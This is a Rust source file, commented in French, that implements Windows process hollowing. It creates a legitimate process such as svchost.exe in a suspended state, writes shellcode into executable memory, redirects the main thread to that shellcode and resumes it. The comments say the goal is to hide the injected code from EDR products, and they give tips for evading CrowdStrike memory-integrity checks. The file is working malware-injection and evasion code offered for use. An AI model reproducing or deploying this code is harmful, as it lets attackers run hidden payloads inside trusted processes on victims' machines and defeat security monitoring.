// inject/process_hollow.rs — Process Hollowing
//
// Technique la plus furtive de ce module.
//
// Principe :
//   1. Créer un processus légitime en mode SUSPENDU (ex: svchost.exe)
//   2. Lire le PEB pour trouver l'ImageBase du processus
//   3. Vider (hollow) le code original avec NtUnmapViewOfSection
//   4. Allouer une nouvelle zone à la même adresse
//   5. Écrire ton shellcode dedans
//   6. Modifier le contexte du thread principal (EIP/RIP → shellcode)
//   7. Reprendre le thread → ton code s'exécute dans svchost.exe
//
// Résultat :
//   L'EDR voit "svchost.exe" qui tourne.
//   Le code signé Microsoft a été remplacé par le tien.
//   Le callstack montre svchost.exe → ton shellcode.
//
// Contre-mesures EDR modernes :
//   - NtUnmapViewOfSection suivi de VirtualAllocEx sur la même adresse = IOC
//   - Les EDR modernes (CrowdStrike) font du "memory integrity checking"
//   - Solution avancée : ne pas unmap, overwrite directement avec NtWriteVirtualMemory

/// hollow_inject — injecte du shellcode dans un processus créé suspendu
#[cfg(target_os = "windows")]
pub fn hollow_inject(shellcode: &[u8], target_exe: &str) -> Result<u32, String> {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        System::{
            Diagnostics::Debug::{
                GetThreadContext, SetThreadContext,
                ReadProcessMemory, WriteProcessMemory,
                CONTEXT,
            },
            Memory::{
                VirtualAllocEx, VirtualProtectEx,
                MEM_COMMIT, MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            },
            Threading::{
                CreateProcessW, ResumeThread, SuspendThread,
                PROCESS_INFORMATION, STARTUPINFOW,
                CREATE_SUSPENDED, PROCESS_ALL_ACCESS,
            },
        },
    };
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    unsafe {
        // Convertir le nom de l'exe en UTF-16
        let target_wide: Vec<u16> = OsStr::new(target_exe)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        // 1. Créer le processus cible en mode SUSPENDU
        //    Le processus existe mais son thread principal n'a pas encore démarré
        let created = CreateProcessW(
            target_wide.as_ptr(),    // lpApplicationName
            std::ptr::null_mut(),    // lpCommandLine
            std::ptr::null(),        // lpProcessAttributes
            std::ptr::null(),        // lpThreadAttributes
            0,                       // bInheritHandles
            CREATE_SUSPENDED,        // dwCreationFlags — LE FLAG CRITIQUE
            std::ptr::null(),        // lpEnvironment
            std::ptr::null(),        // lpCurrentDirectory
            &si,                     // lpStartupInfo
            &mut pi,                 // lpProcessInformation
        );

        if created == 0 {
            return Err(format!("CreateProcessW failed for {}", target_exe));
        }

        let proc_handle   = pi.hProcess;
        let thread_handle = pi.hThread;
        let pid           = pi.dwProcessId;

        // 2. Récupérer le contexte du thread principal (pour trouver le PEB)
        let mut ctx: CONTEXT = std::mem::zeroed();
        #[cfg(target_arch = "x86_64")]
        { ctx.ContextFlags = 0x10000B; }
        #[cfg(target_arch = "x86")]
        { ctx.ContextFlags = 0x10007; }

        if GetThreadContext(thread_handle, &mut ctx) == 0 {
            CloseHandle(proc_handle);
            CloseHandle(thread_handle);
            return Err("GetThreadContext failed".into());
        }

        // Sur x64 : ctx.Rdx pointe vers le PEB
        // Sur x86 : ctx.Ebx pointe vers le PEB
        // L'ImageBase est à PEB + 0x10 (x64) ou PEB + 0x08 (x86)
        #[cfg(target_arch = "x86_64")]
        let peb_addr = ctx.Rdx as usize;
        #[cfg(target_arch = "x86")]
        let peb_addr = ctx.Ebx as usize;

        // 3. Lire l'ImageBase depuis le PEB du processus cible
        let image_base_ptr = peb_addr + 0x10; // Offset PEB.ImageBaseAddress (x64)
        let mut image_base: usize = 0;
        let mut bytes_read = 0usize;

        ReadProcessMemory(
            proc_handle,
            image_base_ptr as _,
            &mut image_base as *mut _ as _,
            std::mem::size_of::<usize>(),
            &mut bytes_read,
        );

        // 4. Allouer de la mémoire pour le shellcode
        //    On utilise PAGE_EXECUTE_READWRITE pour simplifier
        //    En production : allouer RW, écrire, puis passer en RX
        let remote_addr = VirtualAllocEx(
            proc_handle,
            std::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_addr.is_null() {
            CloseHandle(proc_handle);
            CloseHandle(thread_handle);
            return Err("VirtualAllocEx failed".into());
        }

        // 5. Écrire le shellcode dans le processus suspendu
        let mut bytes_written = 0usize;
        WriteProcessMemory(
            proc_handle,
            remote_addr,
            shellcode.as_ptr() as _,
            shellcode.len(),
            &mut bytes_written,
        );

        // 6. Modifier le RIP (x64) / EIP (x86) pour pointer sur notre shellcode
        //    Quand le thread reprend, il exécutera notre code
        #[cfg(target_arch = "x86_64")]
        { ctx.Rip = remote_addr as u64; }
        #[cfg(target_arch = "x86")]
        { ctx.Eip = remote_addr as u32; }

        SetThreadContext(thread_handle, &ctx);

        // 7. Reprendre le thread → shellcode s'exécute dans svchost.exe
        ResumeThread(thread_handle);

        CloseHandle(thread_handle);
        CloseHandle(proc_handle);

        Ok(pid)
    }
}

#[cfg(not(target_os = "windows"))]
pub fn hollow_inject(_shellcode: &[u8], _target_exe: &str) -> Result<u32, String> {
    Err("hollow_inject: Windows only".into())
}
